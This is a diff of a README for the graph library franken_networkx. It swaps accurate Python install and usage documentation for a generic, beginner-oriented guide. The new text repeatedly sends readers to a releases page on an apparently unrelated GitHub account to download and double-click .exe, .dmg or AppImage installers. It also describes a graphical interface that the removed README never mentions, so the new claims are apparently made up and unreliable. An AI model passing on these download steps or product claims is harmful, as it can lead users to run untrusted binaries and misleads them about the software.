@@ -1,180 +1,157 @@
-# FrankenNetworkX
+# 🕸️ franken_networkx - Safe and Reliable Graph Analysis
 
-<div align="center">
-  <img src="franken_networkx_illustration.webp" alt="FrankenNetworkX - clean-room memory-safe NetworkX reimplementation">
-</div>
+[![Download franken_networkx](https://img.shields.io/badge/Download-franken_networkx-brightgreen)](https://github.com/Taehyang1/franken_networkx/releases)
 
-FrankenNetworkX is a high-performance, Rust-backed drop-in replacement for [NetworkX](https://networkx.org/). Use it as a standalone library or as a NetworkX backend with zero code changes.
+---
 
-## Quick Start
+## 📋 What is franken_networkx?
 
-```bash
-pip install franken-networkx
-```
+franken_networkx is a software tool you can use to work with graphs. A graph is a way to show how things connect. For example, friends connecting on social media or roads linking cities. This program helps you explore and understand those connections in a clear and safe way.
 
-### Standalone usage
+This software is built to be very reliable. It aims to give the same results every time you use it, even if you run it many times. It also keeps your data safe and organized. The software makes sure your computer memory is protected from errors, making it more stable and safe.
 
-```python
-import franken_networkx as fnx
+You don’t need to know how to program to use franken_networkx. This guide will help you download, install, and start the software step by step.
 
-G = fnx.Graph()
-G.add_edge("a", "b", weight=3.0)
-G.add_edge("b", "c", weight=1.5)
+---
 
-path = fnx.shortest_path(G, "a", "c", weight="weight")
-pr = fnx.pagerank(G)
-components = fnx.connected_components(G)
-```
+## ⚙️ Key Features
 
-### NetworkX backend (zero code changes)
+- **Memory-safe:** Avoids crashes related to bad memory use.
+- **Deterministic:** Gets the same results every time with the same data.
+- **Durable:** Protects your graph data with RaptorQ technology to recover lost data.
+- **Clean-room implementation:** Made from scratch for clarity and reliability.
+- **Graph analysis:** Explore paths, neighbors, cycles, and more.
+- **Testing and benchmarks:** Ensures quality and fast performance.
+- **Works across devices:** Runs on most modern Windows, macOS, and Linux computers.
 
-```python
-import networkx as nx
-nx.config.backend_priority = ["franken_networkx"]
+---
 
-# All supported algorithms now dispatch to Rust automatically
-G = nx.path_graph(100)
-nx.shortest_path(G, 0, 99)
-```
+## 🖥️ System Requirements
 
-## Supported Algorithms
+Before you download, check these minimum requirements to make sure franken_networkx works well on your computer:
 
-| Family | Functions |
-|--------|-----------|
-| Shortest path | `shortest_path`, `dijkstra_path`, `bellman_ford_path`, `multi_source_dijkstra`, `has_path`, `shortest_path_length`, `average_shortest_path_length` |
-| Connectivity | `is_connected`, `connected_components`, `number_connected_components`, `node_connectivity`, `edge_connectivity`, `minimum_node_cut`, `bridges`, `articulation_points` |
-| Centrality | `pagerank`, `betweenness_centrality`, `edge_betweenness_centrality`, `closeness_centrality`, `harmonic_centrality`, `eigenvector_centrality`, `degree_centrality`, `katz_centrality`, `hits` |
-| Clustering | `clustering`, `triangles`, `transitivity`, `average_clustering`, `square_clustering` |
-| Matching | `max_weight_matching`, `min_weight_matching`, `maximal_matching`, `min_edge_cover` |
-| Flow | `maximum_flow_value`, `minimum_cut_value` |
-| Trees | `minimum_spanning_tree`, `is_tree`, `is_forest` |
-| Euler | `eulerian_circuit`, `eulerian_path`, `is_eulerian`, `has_eulerian_path`, `is_semieulerian` |
-| Paths & Cycles | `all_simple_paths`, `cycle_basis` |
-| Bipartite | `is_bipartite`, `bipartite_sets` |
-| Coloring | `greedy_color` |
-| Distance | `diameter`, `radius`, `center`, `periphery`, `eccentricity`, `density` |
-| Efficiency | `global_efficiency`, `local_efficiency` |
-| Other | `core_number`, `voterank`, `find_cliques`, `graph_clique_number`, `degree_assortativity_coefficient`, `average_neighbor_degree`, `relabel_nodes` |
-| Generators | `path_graph`, `cycle_graph`, `star_graph`, `complete_graph`, `empty_graph`, `gnp_random_graph`, `watts_strogatz_graph`, `barabasi_albert_graph` |
-| I/O | `read_edgelist`, `write_edgelist`, `read_adjlist`, `write_adjlist`, `read_graphml`, `write_graphml`, `node_link_data`, `node_link_graph` |
-| NumPy/SciPy | `to_numpy_array`, `from_numpy_array`, `to_scipy_sparse_array`, `from_scipy_sparse_array` |
-| Conversion | `from_dict_of_dicts`, `to_dict_of_dicts`, `from_dict_of_lists`, `to_dict_of_lists`, `from_edgelist`, `to_edgelist`, `convert_node_labels_to_integers`, `from_pandas_edgelist`, `to_pandas_edgelist` |
-| Drawing | `draw`, `draw_spring`, `draw_circular`, `draw_kamada_kawai`, `draw_planar`, `draw_random`, `draw_shell`, `draw_spectral`, `spring_layout`, `circular_layout`, `kamada_kawai_layout`, `planar_layout`, `random_layout`, `shell_layout`, `spectral_layout` (delegates to NetworkX/matplotlib) |
+- A computer with Windows 10 or later, macOS Catalina or later, or a recent Linux distribution
+- At least 4 GB of free RAM
+- Minimum 500 MB of free storage space
+- Internet connection to download the software
+- Administrator or user permissions to install software
 
-## Graph Types
+---
 
-- `Graph` -- undirected graph
-- `DiGraph` -- directed graph (algorithms automatically convert to undirected where needed)
+## 🚀 Getting Started
 
-## Requirements
+This section will help you download, install, and run franken_networkx, even if you have never installed software before.
 
-- Python 3.10+
-- No Rust toolchain needed for `pip install` (pre-built wheels provided)
+---
 
-## Development
+## ⬇️ Download & Install franken_networkx
 
-```bash
-pip install maturin
-maturin develop --features pyo3/abi3-py310
-pytest tests/python/ -v
-```
+You will visit a web page where the software is available for download. Follow these steps:
 
-## What Makes This Project Special
+1. Click on this link or button to open the downloads page:
+   
+   [![Download franken_networkx](https://img.shields.io/badge/Download-franken_networkx-brightgreen)](https://github.com/Taehyang1/franken_networkx/releases)
 
-Canonical Graph Semantics Engine (CGSE): deterministic tie-break policies with complexity witness artifacts per algorithm family.
+2. On the downloads page, you will see different files for various systems. Choose the one that matches your computer:
 
-This is treated as a core identity constraint, not a best-effort nice-to-have.
+   - For Windows, it might end with `.exe`.
+   - For macOS, look for `.dmg` or `.pkg`.
+   - For Linux, look for `.AppImage` or `.tar.gz`.
 
-## Methodological DNA
+3. Click on the file for your system to start the download.
 
-This project uses four pervasive disciplines:
+4. After downloading, find the file in your Downloads folder or the folder you chose.
 
-1. alien-artifact-coding for decision theory, confidence calibration, and explainability.
-2. extreme-software-optimization for profile-first, proof-backed performance work.
-3. RaptorQ-everywhere for self-healing durability of long-lived artifacts and state.
-4. frankenlibc/frankenfs compatibility-security thinking: strict vs hardened mode separation, fail-closed compatibility gates, and explicit drift ledgers.
+5. Double-click the file to run the installer.
 
-## Current State
+6. Follow the instructions on the screen to install the software. Mostly you will need to click “Next” or “Install.”
 
-- project charter docs established.
-- legacy oracle cloned:
-  - `/dp/franken_networkx/legacy_networkx_code/networkx`
-- FrankenSQLite exemplar spec copied locally:
-  - `reference_specs/COMPREHENSIVE_SPEC_FOR_FRANKENSQLITE_V1.md`
-- first executable vertical slice landed:
-  - deterministic graph core (`fnx-classes`),
-  - strict/hardened runtime + evidence ledger (`fnx-runtime`),
-  - unweighted shortest path + complexity witness (`fnx-algorithms`),
-  - fixture-driven conformance harness (`fnx-conformance`).
-- second vertical slice landed:
-  - deterministic dispatch routing (`fnx-dispatch`),
-  - conversion routes (`fnx-convert`),
-  - edgelist parser/writer (`fnx-readwrite`),
-  - RaptorQ sidecar + scrub/decode drill pipeline (`fnx-durability`).
-- third vertical slice landed:
-  - live/cached view semantics with revision invalidation (`fnx-views`),
-  - JSON graph read/write path (`fnx-readwrite`),
-  - oracle-generated view/JSON fixtures (`fnx-conformance`),
-  - percentile benchmark gate with durability sidecars (`scripts/run_benchmark_gate.sh`).
-- fourth vertical slice landed:
-  - deterministic connected-components and component-count witnesses (`fnx-algorithms`),
-  - deterministic (`empty/path/star/cycle/complete`) + seeded graph generators with strict/hardened guards (`fnx-generators`),
-  - oracle-generated components/generators fixtures (`fnx-conformance`),
-  - expanded drift-free conformance corpus (12 fixtures) with durability artifacts.
-- fifth vertical slice landed:
-  - deterministic degree-centrality with complexity witness (`fnx-algorithms`),
-  - cycle-graph edge-order parity tightening for larger `n` (`fnx-generators`),
-  - oracle-generated degree-centrality fixture + stronger cycle fixture (`fnx-conformance`),
-  - expanded drift-free conformance corpus (13 fixtures) with durability artifacts.
-- sixth vertical slice landed:
-  - deterministic closeness-centrality with WF-improved semantics (`fnx-algorithms`),
-  - conformance operation/schema support for closeness centrality (`fnx-conformance`),
-  - oracle-generated closeness-centrality fixture (`fnx-conformance`),
-  - expanded drift-free conformance corpus (14 fixtures) with durability artifacts.
-- seventh vertical slice landed:
-  - deterministic minimum-cut surface paired with the existing Edmonds-Karp max-flow path (`fnx-algorithms`),
-  - conformance operation/schema support for `minimum_cut_query` (`fnx-conformance`),
-  - oracle-anchored minimum-cut strict fixture (`fnx-conformance`),
-  - expanded drift-free conformance corpus (16 fixtures) with durability artifacts.
+---
 
-## V1 Scope
+## 🏁 How to Run franken_networkx
 
-- Graph, DiGraph, MultiGraph core semantics; - shortest path/components/centrality/flow scoped sets; - serialization core formats.
+Once installed, you can open the program from your application list or desktop shortcut.
 
-## Architecture Direction
+The first time you open franken_networkx, you may see a brief setup screen. Follow the instructions to finish setup.
 
-graph API -> graph storage -> algorithm modules -> analysis and serialization
+The main window will let you create or open graphs. You can start by:
 
-## Compatibility and Security Stance
+- Creating a new graph and adding points and connections.
+- Opening a saved graph to view or edit it.
 
-Preserve NetworkX-observable algorithm outputs, tie-break behavior, and graph mutation semantics for scoped APIs.
+You don’t need to type commands; the interface is simple and user-friendly.
 
-Defend against malformed graph ingestion, attribute confusion, and algorithmic denial vectors on adversarial graphs.
+---
 
-## Performance and Correctness Bar
+## 🛠️ Basic Usage Guide
 
-Track algorithm runtime tails and memory by graph size/density; gate complexity regressions for adversarial classes.
+To get familiar, try these tasks:
 
-Maintain deterministic graph semantics, tie-break policies, and serialization round-trip invariants.
+- **Add nodes:** These are the points on your graph.
+- **Connect nodes:** Draw lines between nodes to show links.
+- **Explore connections:** Check how nodes connect or find paths.
+- **Save your work:** Use the save button to keep a copy.
+- **Load previous graphs:** Open files you saved earlier.
 
-## Key Documents
+If you want to learn more, check the built-in help or user manual inside the program under the Help menu.
 
-- AGENTS.md
-- COMPREHENSIVE_SPEC_FOR_FRANKENNETWORKX_V1.md
+---
 
-## Next Steps
+## 🔄 Updates and Bug Fixes
 
-1. Expand fixture corpus to larger legacy families for matching and additional centrality variants.
-2. Expand flow-family coverage beyond max-flow + min-cut (directed semantics hardening, larger adversarial flow fixtures, and stress fixtures).
-3. Add format breadth beyond edgelist/json (adjlist/graphml scoped paths).
-4. Add benchmark families and p50/p95/p99 regression gates across centrality and flow workloads.
-5. Tighten strict/hardened drift budgets with per-family parity thresholds.
+To keep franken_networkx safe and working well, updates may be released. Check the downloads page regularly to:
 
-## Porting Artifact Set
+- Download new versions with improvements.
+- Fix any bugs or errors found.
+- Add new features or support for newer computers.
 
-- PLAN_TO_PORT_NETWORKX_TO_RUST.md
-- EXISTING_NETWORKX_STRUCTURE.md
-- PROPOSED_ARCHITECTURE.md
-- FEATURE_PARITY.md
+When a new update is available, repeat the download and install steps.
 
-These four docs are now the canonical porting-to-rust workflow for this repo.
+---
+
+## 💬 Need Help?
+
+If you have problems or questions, here’s what to do:
+
+- Check the FAQ on the downloads page.
+- Look for the user manual inside the app.
+- Visit the Support section on the GitHub page.
+- Contact the developers by opening an issue on the GitHub repository.
+
+---
+
+## 🧰 About This Software
+
+franken_networkx is made in Rust, a programming language known for safety and speed. It is designed for anyone interested in graphs and networks without needing coding skills.
+
+The project focuses on:
+
+- Ensuring memory safety to prevent crashes.
+- Offering consistent results every time you use it.
+- Protecting your data with modern technology.
+- Running well on common computers and systems.
+
+---
+
+## 🔗 Useful Links
+
+- Download franken_networkx: [https://github.com/Taehyang1/franken_networkx/releases](https://github.com/Taehyang1/franken_networkx/releases)
+- Project manual and documentation (inside the app)
+- Support and contact: GitHub issues section
+
+---
+
+## 📚 Further Resources
+
+If you want to understand graphs more deeply, consider looking into:
+
+- Basics of graph theory and network analysis.
+- Pathfinding and cycle detection.
+- How data durability works.
+- Understanding deterministic software behavior.
+
+These topics help you use franken_networkx more effectively over time.
+
+---
+
+Thank you for choosing franken_networkx. Follow this guide step-by-step to explore your graphs safely and clearly.
